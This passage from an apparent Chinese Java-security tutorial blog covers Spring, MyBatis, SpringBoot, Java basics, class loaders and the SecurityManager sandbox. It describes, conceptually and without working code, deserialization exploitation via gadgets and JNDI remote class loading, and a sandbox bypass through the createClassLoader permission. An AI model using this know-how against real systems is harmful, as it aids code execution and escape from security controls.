Spring框架介绍\n\nspring是一个一站式开发框架集，功能十分强大，就像一个大家族，有众多衍生产品，例如：springboot、springcloud、springsecurity等等。但他们都是基于spring的ioc和aop，**ioc提供了依赖注入的容器，aop解决了面向切面的编程**，然后在这两者的基础上实现了其他衍生产品的高级功能。\n\n## 什么是IOC\n\n控制反转（Inversion of Control）不是技术，是一种**设计思想**。所谓控制反转是指，本来被调用者的实例是由调用者来创建的，这样的缺点是耦合性太强，IOC则是统一交给spring来管理创建，将对象交给容器管理，你只需要在spring配置文件总配置相应的bean，以及设置相关的属性，让spring容器来生成类的实例对象以及管理对象。在spring容器启动的时候，spring会把你在配置文件中配置的bean都初始化好，然后在你需要调用的时候，就把它已经初始化好的那些bean分配给你需要调用这些bean的类。 \n\n传统设计\n\n![](/images/a3/2.png)\n\nioc思想\n\n![](/images/a3/3.png)\n\n## 什么是AOP\n\n面向切面编程（Aspect Oriented Programming）它与 OOP( Object-Oriented Programming, 面向对象编程) 相辅相成，提供了与 OOP 不同的抽象软件结构的视角来思考程序的结构，通过这种方式弥补面向对象编程(Object Oriented Programming)的不足。除了类以外，AOP提供了切面，切面对关注点进行模块化，例如横切多个类型和对象的事务管理（这些关注点术语通常称作横切(crosscutting)关注点）。Spring AOP是Spring的一个重要组件，但是Spring IOC并不依赖于Spring AOP，这意味着你可以自由选择是否使用AOP，AOP提供了强大的中间件解决方案，这使得Spring IOC更加完善。我们可以通过AOP来实现**日志监听，事务管理，权限控制**等等。\n\n**概念：**\n\n```\n切面（Aspect）：一个关注点的模块化，这个关注点可能会横切多个对象。事务管理是J2EE应用中一个关于横切关注点的很好的例子。在Spring AOP中，切面可以使用基于模式）或者基于@Aspect注解的方式来实现。\n\n连接点（Joinpoint）：在程序执行过程中某个特定的点，比如某方法调用的时候或者处理异常的时候。在Spring\nAOP中，一个连接点总是表示一个方法的执行。\n\n通知（Advice）：在切面的某个特定的连接点上执行的动作。其中包括了“around”、“before”和“after”等不同类型的通知（通知的类型将在后面部分进行讨论）。许多AOP框架（包括Spring）都是以拦截器做通知模型，并维护一个以连接点为中心的拦截器链。\n\n切入点（Pointcut）：匹配连接点的断言。通知和一个切入点表达式关联，并在满足这个切入点的连接点上运行（例如，当执行某个特定名称的方法时）。切入点表达式如何和连接点匹配是AOP的核心：Spring缺省使用AspectJ切入点语法。\n\n引入（Introduction）：用来给一个类型声明额外的方法或属性（也被称为连接类型声明（inter-type\ndeclaration））。Spring允许引入新的接口（以及一个对应的实现）到任何被代理的对象。例如，你可以使用引入来使一个bean实现IsModified接口，以便简化缓存机制。\n\n目标对象（Target Object）： 被一个或者多个切面所通知的对象。也被称做被通知（advised）对象。 既然Spring\nAOP是通过运行时代理实现的，这个对象永远是一个被代理（proxied）对象。\n\nAOP代理（AOP Proxy）：AOP框架创建的对象，用来实现切面契约（例如通知方法执行等等）。在Spring中，AOP代理可以是JDK动态代理或者CGLIB代理。\n\n织入（Weaving）：把切面连接到其它的应用程序类型或者对象上，并创建一个被通知的对象。这些可以在编译时（例如使用AspectJ编译器），类加载时和运行时完成。Spring和其他纯Java AOP框架一样，在运行时完成织入。\n\n通知类型：\n\n前置通知（Before advice）：在某连接点之前执行的通知，但这个通知不能阻止连接点之前的执行流程（除非它抛出一个异常）。\n\n后置通知（After returning advice）：在某连接点正常完成后执行的通知：例如，一个方法没有抛出任何异常，正常返回。\n\n异常通知（After throwing advice）：在方法抛出异常退出时执行的通知。\n\n最终通知（After (finally) advice）：当某连接点退出的时候执行的通知（不论是正常返回还是异常退出）。\n\n环绕通知（Around Advice）：包围一个连接点的通知，如方法调用。这是最强大的一种通知类型。环绕通知可以在方法调用前后完成自定义的行为。它也会选择是否继续执行连接点或直接返回它自己的返回值或抛出异常来结束执行。\n```\n\n看完了上面的理论部分知识, 相信大家还是对AOP 的概念云里雾里的, 因为 AOP 中的概念是在是太多了, 我们也不必理解的那么透彻，直接从网上找个例子说明一下 AOP 中 Aspect，Joint point，Point cut 与 Advice之间的关系。\n\n```\n让我们来假设一下，从前有一个叫爪哇的小县城，在一个月黑风高的晚上，这个县城中发生了命案。 作案的凶手十分狡猾，现场没有留下什么有价值的线索。不过万幸的是，刚从隔壁回来的老王恰好在这时候无意中发现了凶手行凶的过程，但是由于天色已晚，加上凶手蒙着面，老王并没有看清凶手的面目，只知道凶手是个男性，身高约七尺五寸。 爪哇县的县令根据老王的描述，对守门的士兵下命令说: 凡是发现有身高七尺五寸的男性，都要抓过来审问。 士兵当然不敢违背县令的命令，只好把进出城的所有符合条件的人都抓了起来。\n\n来让我们看一下上面的一个小故事和 AOP 到底有什么对应关系。\n\n首先我们知道，在 Spring AOP 中 Joint point 指代的是所有方法的执行点，而 point cut 是一个描述信息，它修饰的是 Joint point，通过 point cut，我们就可以确定哪些 Joint point 可以被织入 Advice。 对应到我们在上面举的例子，我们可以做一个简单的类比，Joint point 就相当于 爪哇的小县城里的百姓,pointcut 就相当于 老王所做的指控，即凶手是个男性，身高约七尺五寸，而 Advice 则是施加在符合老王所描述的嫌疑人的动作: 抓过来审问。\n为什么可以这样类比呢?\n\nJoint point ： 爪哇的小县城里的百姓: 因为根据定义，Joint point 是所有可能被织入 Advice 的候选的点，在 Spring AOP中，则可以认为所有方法执行点都是 Joint point。 而在我们上面的例子中，命案发生在小县城中，按理说在此县城中的所有人都有可能是嫌疑人。\n\nPointcut ：男性，身高约七尺五寸: 我们知道，所有的方法(joint point) 都可以织入 Advice，但是我们并不希望在所有方法上都织入 Advice，而 Pointcut 的作用就是提供一组规则来匹配join point，给满足规则的 join point 添加 Advice。 同理，对于县令来说，他再昏庸，也知道不能把县城中的所有百姓都抓起来审问，而是根据凶手是个男性，身高约七尺五寸，把符合条件的人抓起来。 在这里 凶手是个男性，身高约七尺五寸 就是一个修饰谓语，它限定了凶手的范围，满足此修饰规则的百姓都是嫌疑人，都需要抓起来审问。\n\nAdvice ：抓过来审问，Advice 是一个动作，即一段 Java 代码，这段 Java 代码是作用于 point cut 所限定的那些 Joint point 上的。 同理，对比到我们的例子中，抓过来审问 这个动作就是对作用于那些满足 男性，身高约七尺五寸 的爪哇的小县城里的百姓。\n\nAspect:：Aspect 是 point cut 与 Advice 的组合，因此在这里我们就可以类比: “根据老王的线索，凡是发现有身高七尺五寸的男性，都要抓过来审问” 这一整个动作可以被认为是一个 Aspect。\n```\n\n说完AOP专业名词的概念，再来说下AOP具体的。相信大家对于OOP的理解不难，就以人（people）来说，我们就可以把它看做一类对象，people有身高、体重、年龄等属性，也有跑步、吃饭、睡觉、娱乐等行为，把这些属于people的属性和行为封装在people类中，然后以统一调用的方式（创建一个people类实例对象，通过这个对象实例来调用这些属性和行为）就叫做OOP思想。\n\nOOP给我们的感觉就是结构清晰，高内聚，易维护等。这些属于一种从上到下的关系（即这个类封装的所有属性和方法都是属于people的），而我们的AOP思想就是一种从左到右的关系，以切入的方式将业务逻辑功能应用到每一层结构中（可以理解为类方法，类方法也是一种对象的行为实现）。\n\n举个例子，people也可以分为少年、青年、中年、和老年，这几类人除了拥有自己的属性和行为外，生活中，或许还需要去医院看病，但是医院看病这一个逻辑业务功能并不是属于哪一类，而是谁生病了，才需要到医院看病，而基于面向对象编程的思想，我们是不可能把这一个业务逻辑行为加到每一个类中的，这不符合OOP思想，而这个就是AOP所做也可以做到事情了，AOP就是把医院看病这一个业务逻辑功能抽取出来，然后动态把这个功能注入到需要的方法（或行为）中，以后，不管是谁需要看病，就到医院这个第三方机构看病（AOP就是相当于把这个第三方机构独立出来），**这样从业务逻辑角度上，AOP达到了更近一步的的解耦，所以我们也称AOP是对OOP的完善和增强。**\n\n而我们的编程中，常用到AOP的就是安全校验、日志操作、事务操作等，接下来一张图认识AOP思想：\n\n![](/images/a3/4.png)\n\n AOP就是使用上图所示的“横切”技术，AOP把软件系统分为两个部分：**核心关注点和横切关注点**。业务处理的主要流程是核心关注点，与之关系不大的部分是横切关注点。横切关注点的一个特点是，他们经常发生在核心关注点的多处，而各处都基本相似。比如权限认证、日志、事务处理。Aop 的作用在于分离系统中的各种关注点，将核心关注点和横切关注点分离开来。正如Avanade公司的高级方案构架师Adam Magee所说，AOP的核心思想就是**“将应用程序中的商业逻辑同对其提供支持的通用服务进行分离。”**\n\n## SpringMVC框架\n\n**SpringMVC** 是基于 Java 语言实现 MVC 设计模式的请求驱动类型的轻量级 Web 框架，目的是将 Web 开发模块化及代码简化。其提供了 DispatcherServlet 前端控制器分派请求，同时提供灵活的配置处理程序映射、视图解析，并支持文件上传。\n\n![](/images/a3/5.png)\n\n\n\n## MyBatis框架\n\nMyBatis 是一款优秀的持久层框架，它支持定制化 SQL、存储过程以及高级映射。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以使用简单的 XML 或注解来配置和映射原生类型、接口和 Java 的 POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。\n\n![](/images/a3/6.png)\n\n**MyBatis 的优点如下：**\n\n- 封装了 JDBC 大部分操作，减少开发人员工作量；\n- 相比一些自动化的 ORM 框架，“半自动化”使得开发人员可以自由的编写 SQL 语句，灵活度更高；\n- Java 代码与 SQL 语句分离，降低维护难度；\n- 自动映射结果集，减少重复的编码工作；\n- 开源社区十分活跃，文档齐全，学习成本不高。\n\n## SpringBoot框架\n\n### 什么是SpringBoot\n\nSpring Boot 是所有基于 Spring 开发的项目的起点。Spring Boot 的设计是为了让你尽可能快的跑起来 Spring 应用程序并且尽可能减少你的配置文件。简单来说就是SpringBoot其实不是什么新的框架，它默认配置了很多框架的使用方式，就像maven整合了所有的jar包，spring boot整合了所有的框架（不知道这样比喻是否合适）。\n\n### SpringBoot四个主要特性\n\n1. SpringBoot Starter：他将常用的依赖分组进行了整合，将其合并到一个依赖中，这样就可以一次性添加到项目的Maven或Gradle构建中；\n\n2. 自动配置：SpringBoot的自动配置特性利用了Spring4对条件化配置的支持，合理地推测应用所需的bean并自动化配置他们；\n\n3. 命令行接口：（Command-line-interface, CLI）：SpringBoot的CLI发挥了Groovy编程语言的优势，并结合自动配置进一步简化Spring应用的开发；\n\n4. Actuatir：它为SpringBoot应用的所有特性构建一个小型的应用程序。\n\n**简单来说，springboot也是属于spring框架中的一种，但是springboot”约定大于配置“的丽娘，极大简化了spring应用的初始搭建以及开发过程**\n\n# 框架比较\n\n**struts2 和 springMvc：**\n\n1. springmvc入口是一个servlet前端控制器(DispatcherServlet)，struts2入口是一filter过滤器(StrutsPrepareAndExecuteFilter)。\n\n2. struts2通过在action类中定义成员变量接收参数，(属性驱动和模型驱动)，它只能使用多例模式管理action。springmvc通过在coontroller方法中定义形参接收参数，springmvc可以使用单例模式管理controller。 \n\n3. springmvc是基于方法开发的，注解开发中使用requestMapping将url和方法进行映射，如果根据url找到controller类的方法生成一个handler处理器对象(只包括一个method)。struts2是基于类开发的，每个请求过来创建一个action实例，实例对象中有若干个方法。开发中建议使用springmvc，springmvc方法更类似service业务方法。\n4. struts2采用值栈存储请求和相应的数据,通过OGNL存取数据，springmvc通过参数绑定期将request请求内容解析，并给方法形参赋值。\n5. struts2和springmvc的速度是相当的，由于struts2的漏洞较多，更多企业使用springmvc。\n\n**springMvc和springBoot：**\n\n1. springMvc属于一个企业WEB开发的MVC框架，涵盖面包括前端视图开发、文件配置、后台接口逻辑开发等，XML、config等配置相对比较繁琐复杂。\n2. springBoot框架相对于springMvc框架来说，更专注于开发微服务后台接口，不开发前端视图。\n\n\n**参考：**\n\nhttps://mybatis.org/mybatis-3/zh/index.html\n\nhttps://blog.csdn.net/qq_42494445/article/details/83926216\n\nhttps://blog.csdn.net/qq_41701956/article/details/81215309\n\nhttps://blog.csdn.net/wangzhidong_java/article/details/82974503","tags":["JAVA","安全"],"categories":["JAVA安全教程"]},{"title":"JAVA基础教程","url":"/2018/11/26/JAVA基础教程/","content":"\n# 简介\n\n本篇是整个java安全学习系列的基础篇，这个系列篇章我会把我的整个java安全学习过程进行一个总结。至于为什么想写这个系列文章，是因为当时听了小伙伴的分享中提到“21小时可以入门任何课程”，看了他整理的学习导图，深受启发。所以，我打算把过去的和新学习的东西，完整的、系统的归纳总结出来，做到温故而知新。\n\n# 学习流程\n\n![](/images/a1/1.png)\n\n这个是我整理的java的学习路线图，每个人可能有不同的理解，大家可以自己动手进行自己的学习规划。并且学习过程是动态的，可能在学习总结过程中，我会修增某些模块。本篇我将对第一部分-基础，进行讲解。\n\n# java基础\n\n这边讨论的基础，不是java的基础语法，这部分自己可以快速入门学习。我要讲的部分，是java的一些特性，或者比较重要的语法，在看代码中或者分析payload经常用到的。这部分是我在实践过程中觉得难点和重点，每个人的理解方法不同，所以并不适用所有人的学习，不过理解以下概念方法对于java安全学习是有帮助的，这点可以肯定。\n\n## 基本语法\n\n### 泛类型\n\n泛型，即“参数化类型”。一提到参数，最熟悉的就是定义方法时有形参，然后调用此方法时传递实参。那么参数化类型怎么理解呢？\n\n顾名思义，就是将类型由原来的具体的类型参数化，类似于方法中的变量参数，此时类型也定义成参数形式（可以称之为类型形参），然后在使用/调用时传入具体的类型（类型实参）。\n\n泛型的本质是为了参数化类型（在不创建新的类型的情况下，通过泛型指定的不同类型来控制形参具体限制的类型）。也就是说在泛型使用过程中，操作的数据类型被指定为一个参数，这种参数类型可以用在类、接口和方法中，分别被称为泛型类、泛型接口、泛型方法。\n\n最典型的泛型类应用就是各种容器类，如：List、Set、Map。自己定义的泛型类形式如下：\n\n```java\n//此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型\n//在实例化泛型类时，必须指定T的具体类型\npublic class Generic<T>{ \n    //key这个成员变量的类型为T,T的类型由外部指定  \n    private T key;\n\n    public Generic(T key) { //泛型构造方法形参key的类型也为T，T的类型由外部指定\n        this.key = key;\n    }\n\n    public T getKey(){ //泛型方法getKey的返回值类型为T，T的类型由外部指定\n        return key;\n    }\n}\n```\n\n更多泛型基本知识内容可参考：[https://www.cnblogs.com/coprince/p/8603492.html](https://www.cnblogs.com/coprince/p/8603492.html)\n\n### 对象类型、基本类型\n\nJava中的对象分两种类型：**基本类型和非基本类型（对象类型）。**\n\n基本类型就是那些最常用的类型，例如：boolean/char/byte/short/int/long/float/double，这些类型有个特点，就是变量直接存储值。\n\n除了基本类型之外的都是非基本类型了。非基本类型有个显著特点就是初始化的时候一般需要使用new来创建一个对象，所以非基本类型也叫非基本类型。例如:String name=new String(Tom);。非基本类型跟基本类型的本质区别，在于**非基本类型变量存储的不是值，而是引用。**\n\n## 命令执行的方法\n\njava命令执行，主要有两种方法Runtime.getRuntime().exec(cmd) 和ProcessBuilder(cmd).start，实例如下：\n\n```java\npackage com.manba.demo;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class CmdTest {\n    public static void rexec() throws IOException {\n        String cmds = \"/bin/sh -c pwd\"; // 也可以数组形式\n        Process process = Runtime.getRuntime().exec(cmds);\n        BufferedReader Reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = Reader.readLine()) != null) System.out.println(line);\n    }\n\n    public static void pexexc() throws IOException {\n        String[] cmds = {\"/bin/sh\", \"-c\", \"ls\"}; // 只能数组形式\n        Process pb = new ProcessBuilder(cmds).start();\n        BufferedReader Reader = new BufferedReader(new InputStreamReader(pb.getInputStream()));\n        String line;\n        while ((line = Reader.readLine()) != null) System.out.println(line);\n    }\n\n    public static void main(String[] args) throws IOException {\n        rexec();\n        pexexc();\n    }\n\n}\n```\n\n这两个方法的主要区别在于Runtime.getRuntime.exec是静态方法，而ProcessBuilder().start不是静态方法，这在strust2中构造payload，是很有用的。\n\n## Java Bean和Factory概念\n\n**JavaBeans**：Java中一种**特殊的类**，可以将多个对象封装到一个对象（bean）中。特点是可序列化，提供无参构造器，提供getter方法和setter方法访问对象的属性。名称中的“Bean”是用于Java的可重用软件组件的惯用叫法。\n\n```java\npackage com.manba.demo; \npublic class SimpleBean{  \n    private String name;  \n    private int age;  \n    public void setName(String name){  \n        this.name = name;  \n    }  \n    public void setAge(int age){  \n        this.age = age;  \n    }  \n    public String getName(){  \n        return this.name;  \n    }  \n    public int getAge(){  \n        return this.age;  \n    }  \n}  \n```\n\n**总结如下：**\n\n1. 所有的类必须声明为public \n\n2. 所有属性为private\n3. 提供默认构造方法\n4. 提供getter和setter\n5. 实现serializable接口\n\n**Java Factory定义**：定义一个创建对象的接口，但让实现这个接口的类来决定实例化哪个类，工厂方法让类的实例化推迟到了子类中进行，它属于创建类型。\n\n```\n通俗理解与做法：\n\t\t定义一个抽象类或者接口来当规范工厂，它是一个只声明方法叫什么名字不实现方法的内容的一个规范类；\n  \t定义具体工厂实现或者继承规范工厂，然后重写规范工厂中定义的方法，在该方法中生产属于自己工厂的对象;\n  \t使用的时候，new工厂的时候是具体工厂给规范工厂进行赋值。即=号左边是规范工厂类型，右边是具体工厂类型，想获哪个具体工厂生产的对象就使用哪个具体工厂类型，最后利用对象调用方法来获取具体工厂生产的;\n\n注意点：\n\t\t要有一个规范工厂，该工厂只负责声明方法叫什么名字，不实现方法的内容;\n    每一个具体工厂都要继承或者实现规范工厂，重写它的方法，在方法中生产自己工厂的对象;\n    使用的时候一定要具体工厂给规范工厂进行赋值;\n```\n\n代码案例：\n\n```java\n//StandardFactory----规范工厂      \n//SpecificFactory----具体工厂       \npackage com.manba.demo;\n\npublic class Product {\n    interface StandardFactory {\n        public Product createProduct();\t\t//声明了方法叫这个名字\n    }\n\n    static class SpecificFactory implements StandardFactory {\n        @Override\n        public Product createProduct() {\t//具体工厂实现规范工厂并重写它的方法生产属于工厂的对象\n            return new Product();         //这是属于该具体工厂生产的对象\n        }\n    }\n\n    public static class Client {\n        public static void main(String[] args) {\n            StandardFactory factory = new SpecificFactory();\n            Product prodect = factory.createProduct();\n        }\n    }\n}\n```\n\n## Java Maven\n\nMaven 翻译为\"专家\"、\"内行\"，是 Apache 下的一个纯 Java 开发的开源项目。基于项目对象模型（缩写：POM）概念，Maven利用一个中央信息片断能管理一个项目的构建、报告和文档等步骤。Maven 是一个项目管理工具，可以对 Java 项目进行构建、依赖管理。\n\nPOM( Project Object Model，项目对象模型 ) 是 Maven 工程的基本工作单元，是一个XML文件，包含了项目的基本信息，用于描述项目如何构建，声明项目依赖，等等。执行任务或目标时，Maven 会在当前目录中查找 POM。它读取 POM，获取所需的配置信息，然后执行目标。\n\nPOM 中可以指定以下配置：\n\n- 项目依赖\n- 插件\n- 执行目标\n- 项目构建 profile\n- 项目版本\n- 项目开发者列表\n- 相关邮件列表信息\n\n**Maven 参数**\n\n-D 传入属性参数 \n-P 使用pom中指定的配置 \n-e 显示maven运行出错的信息 \n-o 离线执行命令,即不去远程仓库更新包 \n-X 显示maven允许的debug信息 \n-U 强制去远程参考更新snapshot包 \n其他参数可以通过mvn help 获取\n\n**1、mvn clean** \n\n说明: 清理项目生产的临时文件,一般是模块下的target目录\n\n**2、mvn package** \n\n说明: 项目打包工具,会在模块下的target目录生成jar或war等文件，如下运行结果\n\n**3、mvn test** \n\n说明: 测试命令,或执行src/test/java/下junit的测试用例\n\n**4、mvn install** \n\n说明: 模块安装命令 将打包的的jar/war文件复制到你的本地仓库中，供其他模块使用。 -Dmaven.test.skip=true 跳过测试(同时会跳过test compile)\n\n**5、mvn deploy** \n\n说明: 发布命令 将打包的文件发布到远程参考,提供其他人员进行下载依赖 ,一般是发布到公司的私服\n\n**mvn 快速构建java项目命令**\n\n```xml\nmvn archetype:generate -DgroupId=com.companyname.bank -DartifactId=consumerBanking -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false\n```\n\n**mvn 快速构建web项目**\n\n```xml\nmvn archetype:generate -DgroupId=com.companyname.automobile -DartifactId=trucks -DarchetypeArtifactId=maven-archetype-webapp  -DinteractiveMode=false\n```\n\nMaven内容很多，这边给大家介绍下概念，以及最基本用法，详细知识点大家可以移步到https://www.runoob.com/maven/maven-tutorial.html学习。\n\n## IDEA调试远程调试\n\n**配置tomcat调试模式**\n\ndockerfile配置样例，tomcat以调试模式打开\n\n```dockerfile\nFROM vulhub/tomcat:8.5\n\nMAINTAINER phithon <root@leavesongs.com>\n\nUSER root\nRUN set -ex \\\n    && rm -rf /usr/local/tomcat/webapps/* \\\n    && chmod a+x /usr/local/tomcat/bin/*.sh\nCOPY S2-001.war /usr/local/tomcat/webapps/ROOT.war\nENV JPDA_ADDRESS 5005\nENV JPDA_TRANSPORT dt_socket\nCMD [\"catalina.sh\", \"jpda\", \"run\"]\nEXPOSE 8080\nEXPOSE 5005\n```\n\ndocker-compose.yml配置样例\n\n```dockerfile\nversion: '2'\nservices:\n struts2:\n   build: .\n   ports:\n    - \"8080:8080\"\n    - \"5005:5005\"\n```\n\n然后docker-compose up -d就启动tomcat的调试模式\n\n**配置IDEA，连接远程服务器**\n\n点击Edit Configurations\n\n![](/images/a1/2.png)\n\n配置Remote\n\n![](/images/a1/3.png)\n\n点击debug，连接成功显示如下所示内容\n\n![](/images/a1/4.png)\n\n# JVM类加载器\n\n## 类加载器简介\n\n类加载器（class loader）用来加载 Java 类到 Java 虚拟机中。一般来说，Java 虚拟机使用 Java 类的方式如下：Java 源程序（.java 文件）在经过 Java 编译器编译之后就被转换成 Java 字节代码（.class 文件）。**类加载器负责读取 Java 字节代码，并转换成 java.lang.Class 类的一个实例**。每个这样的实例用来表示一个 Java 类。\n\n**基本上所有的类加载器都是 java.lang.ClassLoader 类的一个实例**。java.lang.ClassLoader 类的基本职责就是根据一个指定的类的名称，找到或者生成其对应的字节代码，然后从这些字节代码中定义出一个 Java 类，即 java.lang.Class 类的一个实例。\n\nJava 中的类加载器大致可以分成两类，一类是系统提供的，另外一类则是由 Java 应用开发人员编写的，开发人员可以通过继承 java.lang.ClassLoader 类的方式实现自定义类加载器，以满足一些特殊的需求。\n\n系统提供的类加载器主要有下面三个：\n\n- **引导类加载器(Bootstrap ClassLoader)**：负责将 $JAVA_HOME/lib 或者 -Xbootclasspath 参数指定路径下面的文件(按照文件名识别，如 rt.jar) 加载到虚拟机内存中。它用来加载 Java 的核心库，是用原生代码实现的，并不继承自 java.lang.ClassLoader，引导类加载器无法直接被 java 代码引用。\n- **扩展类加载器(Extension ClassLoader)**：负责加载 $JAVA_HOME/lib/ext 目录中的文件，或者 java.ext.dirs 系统变量所指定的路径的类库，它用来加载 Java 的扩展库。\n- **应用程序类加载器(Application ClassLoader)**：一般是系统的默认加载器，它根据 Java 应用的类路径（CLASSPATH）来加载 Java 类。一般 Java 应用的类都是由它来完成加载的，可以通过 ClassLoader.getSystemClassLoader() 来获取它。\n\n## 类加载过程 — 双亲委派模型\n\n（1） 类加载器结构\n\n除了引导类加载器之外，所有的类加载器都有一个父类加载器。应用程序类加载器的父类加载器是扩展类加载器，扩展类加载器的父类加载器是引导类加载器。一般来说，开发人员自定义的类加载器的父类加载器是应用程序类加载器。\n\n![](/images/a1/5.png)\n\n（2）双亲委派模型\n\n类加载器在尝试去查找某个类的字节代码并定义它时，会先代理给其父类加载器，由父类加载器先去尝试加载这个类，如果父类加载器没有，继续寻找父类加载器，依次类推，如果到引导类加载器都没找到才从自身查找。这个类加载过程就是双亲委派模型。\n\n首先要明白，**Java 虚拟机判定两个 Java 类是否相同，不仅要看类的全名是否相同，还要看加载此类的类加载器是否一样(可以通过 class.getClassLoader() 获得)**。只有两个类来源于同一个Class文件，并且被同一个类加载器加载，这两个类才相等。不同类加载器加载的类之间是不兼容的。\n\n双亲委派模型就是为了保证 Java 核心库的类型安全的。所有 Java 应用都至少需要引用 java.lang.Object 类，也就是说在运行的时候，java.lang.Object 这个类需要被加载到 Java 虚拟机中。如果这个加载过程由 Java 应用自己的类加载器来完成的话，很可能就存在多个版本的 java.lang.Object 类，而这些类之间是不兼容的。通过双亲委派模型，对于 Java 核心库的类加载工作由引导类加载器来统一完成，保证了 Java 应用所使用的都是同一个版本的 Java 核心库的类，是互相兼容的。\n\n类加载器在成功加载某个类之后，会把得到的 java.lang.Class 类的实例缓存起来。下次再请求加载该类的时候，类加载器会直接使用缓存的类的实例，而不会尝试再次加载。\n\n# SecurityManager沙箱分析\n\n## 简介\n\n安全管理器（SecurityManger）是为了保护JVM在运行有漏洞或恶意的代码不会破坏外部资源，这是api级别的，可自定义的安全策略管理器。\n\n安全管理器（SecurityManger）在java中的作用就是检查操作是否有权限执行，是java沙箱的基础组件。通过Java命令行启动的java应用程序，默认不启用沙箱。要启动沙箱，需要：\n\n```java\njava -Djava.security.manager <other args>\n```\n\n也可以指定策略文件：\n\n```java\njava -Djava.security.policy=<URL>\n```\n\n如果要求启动时只遵循一个策略文件，启动需要双等号，如下：\n\n```java\njava -Djava.security.policy==<URL>\n```\n\n还可以在代码中使用硬编码System.setSecurityManager()来启动安全管理器\n\n## 安全策略文件\n\n策略文件制定了具体的代码权限。可以使用jdk自带的policytool工具查看或编辑。\n\njava.policy有三个条目，每一条在java.policy文件中为一条grant记录，每一个grant记录含有一个codeBase（指定代码）及其permission（许可）：\n\n```\ngrant codeBase source { \n\tpermission permission_class_name ation;\n}\n```\n\n每一条grant记录遵循下面格式：\n\n* 以保留字“grant”开头，表示一条新的记录开始。\n* “permission”也是保留字，标记一个新的许可开始。\n* 每一个grant记录授予一个指定的代码（CodeBase）一套许可（Permissons）。\n* source指定目标类的位置\n* ation用于指定目标类拥有的权限\n\nsource三种通配符：\n\n1. directory/ 表示directory目录下所有.class文件，不包括.jar文件\n2. directory/* 表示directory目录下所有的.class及.jar文件\n3. directory/- 表示dierctory目录下的所有.class及.jar文件，包括子目录\n\n## 权限\n\n权限定义的格式包含三部分：权限类型、权限名和允许的操作。例：\n\n```\n// 权限类型\npermission java.security.AllPermission\n\n// 权限类型+权限名\npermission java.loang.RuntimePermission \"stopThread\";\n\n// 权限类型+权限名+允许的操作\npermission java.io.FilePermission \"/tmp/test\" \"read\"\n```\n\n所有权限列表\n\n|            | 类型                                | 权限名                                                   | 操作                   | 例子                                                         |      |\n| ---------- | ----------------------------------- | -------------------------------------------------------- | ---------------------- | ------------------------------------------------------------ | ---- |\n| 文件权限   | java.io.FilePermission              | 文件名（平台依赖）                                       | 读、写、删除、执行     | 允许所有文件的读写删除执行：permission java.io.FilePermission \"<< ALL FILES>>\", \"read,write,delete,execcute\"; |      |\n| 套接字权限 | java.net.SocketPermission           | 主机名:端口                                              | 接收、监听、连接、解析 | 允许实现所有套接字操作：permission java.net.SocketPermission \":1-\",\"accept,listen,connect,resolve\"; |      |\n| 属性权限   | java.util.PropertyPermission        | 需要访问的jvm属性名                                      | 读、写                 | 读标准java属性：permission java.util.PropertyPermission \"java.\",\"read\"; |      |\n| 运行时权限 | java.lang.RuntimePermission         | 多种权限名                                               | 无                     | 允许代码初始化打印任务：permission java.lang.RuntimePermission \"queuePrintJob\" |      |\n| AWT权限    | java.awt.AWTPermission              | 6种权限名                                                | 无                     | 允许代码充分使用test类：permission java.awt.AWTPermission \"createTest\";permission java.awt.AWTPermission \"readDisplayPixels\"; |      |\n| 网络权限   | java.net.NetPermission              | 3种权限名                                                | 无                     | 允许安装流处理器：permission java.net.NetPermission \"specifyStreamHandler\"; |      |\n| 安全权限   | java.security.SecurityPermission    | 多种权限名                                               | 无                     |                                                              |      |\n| 序列化权限 | java.io.SerializeablePermission     | 2种权限名                                                | 无                     |                                                              |      |\n| 反射权限   | java.lang.reflect.ReflectPermission | suppressAccessChecks（允许利用反射检查任意类的私有变量） |                        |                                                              |      |\n| 完全权限   | java.security.AllPermission         | 无（拥有执行任何操作的权限）                             |                        |                                                              |      |\n\n## SecurityManager的原理与影响\n\n一般API设计到安全管理器的原理：\n\n1. 请求java api\n2. java api使用安全管理器判断许可权限\n3. 通过则顺序执行，否则抛出Exception\n\n例如JDK源码中的FileInputStream类，如果开启沙箱，则安全管理器不是null，检查checkRead（name）。而checkRead方法则是依据访问控制策略的一个权限检查。\n\n![](/images/a1/6.png)\n\n###如何破坏反序列化漏洞\n\n对于java反序列对象漏洞利用来说，一般两种形式：\n\n1. 在classpath下寻找弱点jar包，通过gadget串联拼凑最终通过该反序列执行任意代码。 -- **这种场景实际利用困难，一方面适合的gadget不容易找，另一方面业界已经披露有问题的三方件，产品一般都已升级**\n2. 在classpath下寻找弱点jar包，结合**JDNI注入**，通过远程加载恶意类执行任意代码 -- **这种手法是目前更有效的一种方法**\n\n可以通过安全策略限制文件执行权限，导致rce失败。\n\n### 如何绕过SecurityManager\n\n如果policy中设置存在如下规则：\n\n```\npermission java.lang.RuntimePermission \"createClassLoader\";\n```\n\n则存在绕过可能性。\n\n原理：当我们拥有建立一个自己的ClassLoader的权限，我们完全可以在这个ClassLoader中建立自己的一个class，并赋予一个新的SecurityManager策略，这个策略也可以是null，及关闭整个java安全管理器。核心在ClassLoader存在一个方法叫defineClass，defineClass允许接受一个参数ProtectionDomain，我们能够自建一个ProtectionDomain将自己配置好的权限设置进去，define出来的class则拥有新的权限。\n\n\n\n**参考：**\n\n[https://www.cnblogs.com/coprince/p/8603492.html](https://www.cnblogs.com/coprince/p/8603492.html)\n\nhttps://segmentfault.com/a/1190000020248225?utm_source=tag-newest\n\nhttps://www.runoob.com/maven/maven-tutorial.html\n\nhttps://blog.csdn.net/belvine/article/details/89552524\n\n","tags":["JAVA","安全"],"categories":["JAVA安全教程"]}]